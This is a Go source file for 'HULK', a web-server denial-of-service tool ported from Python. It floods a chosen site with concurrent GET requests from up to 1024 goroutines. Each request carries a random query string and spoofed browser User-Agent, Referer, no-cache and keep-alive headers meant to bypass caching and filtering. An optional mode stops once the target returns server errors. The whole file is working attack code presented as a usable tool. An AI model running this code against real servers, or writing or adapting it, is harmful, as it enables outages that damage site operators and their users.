package main

/*
 HULK DoS tool on Goroutines. Ported from Python. 
 Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/

 This go program licensed under GPLv3.
 Copyright Alexander I.Grafov <grafov@gmail.com>
*/

import (
	"os"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"math/rand"
	"os/signal"
	"syscall"
	"strings"
	"strconv"
	"runtime"
)

// const ACCEPT_CHARSET = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
const ACCEPT_CHARSET = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	STARTED = iota
	GOT_OK
	EXIT_ERR
	TARGET_OK
)

// global params
var request_counter int = 0
var safe bool = false
var headers_referers []string = []string{
	"http://www.google.com/?q=",
	"http://www.usatoday.com/search/results?q=",
	"http://engadget.search.aol.com/search?q=",
	//"http://www.google.ru/?hl=ru&q=",
	//"http://yandex.ru/yandsearch?text=",
}
var headers_useragents []string = []string{
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
}


func main() {
	var safe bool
	var site string

	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
	flag.Parse()
	
	t := os.Getenv("HULKMAXPROCS")
	maxproc, e := strconv.Atoi(t)
	if e != nil {
		maxproc = 1024
	}

	u, e := url.Parse(site)
	if e != nil {
		fmt.Println("Error parsing url parameter.")
		os.Exit(1)
	}

	go func() {
		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
		ss := make(chan int, 64) // start/stop flag
		cur, err, sent := 0, 0, 0
		fmt.Println("In use |\tResp OK |\tGot err")
		for {
			if cur < maxproc {
				go httpcall(site, u.Host, ss)
			}
			if sent % 10 == 0 {
				fmt.Printf("\r%6d |\t%7d |\t%6d", cur, sent, err)
			}
			switch <-ss {
			case STARTED:
				cur++
			case EXIT_ERR:
				err++
				cur--
				if err % 10 == 0 {
					runtime.GC()
				}
			case GOT_OK:
				sent++
			case TARGET_OK:
				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n-- Interrupted by user --        \n")
}

func httpcall(url string, host string, s chan int) {
	var param_joiner string
	var client = new(http.Client)

	s<-STARTED
	if strings.ContainsRune(url, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}

Reuse:
	q, e := http.NewRequest("GET", url + param_joiner + buildblock(rand.Intn(7) + 3) + "=" + buildblock(rand.Intn(7) + 3), nil)
	if e != nil {
		s<-EXIT_ERR
		return
	}
	q.Header.Set("User-Agent", headers_useragents[rand.Intn(len(headers_useragents))])
	q.Header.Set("Cache-Control", "no-cache")
	q.Header.Set("Accept-Charset", ACCEPT_CHARSET)
	q.Header.Set("Referer", headers_referers[rand.Intn(len(headers_referers))] + buildblock(rand.Intn(5) + 5))
	q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
	q.Header.Set("Connection", "keep-alive")
	q.Header.Set("Host", host)	
	r, e := client.Do(q)	
	if e != nil {
		fmt.Fprintln(os.Stderr, e.Error())
		s<-EXIT_ERR
		return
	}
	r.Body.Close()
	s<-GOT_OK
	if safe {
		switch r.StatusCode {
		case 500, 501, 502, 503, 504:
			s<-TARGET_OK
		}
	}
	goto Reuse
}

func buildblock(size int)(s string) {
	var a []rune
	for i := 0; i < size; i++ {
        a = append(a, rune(rand.Intn(25) + 65))
	}
	return string(a)
}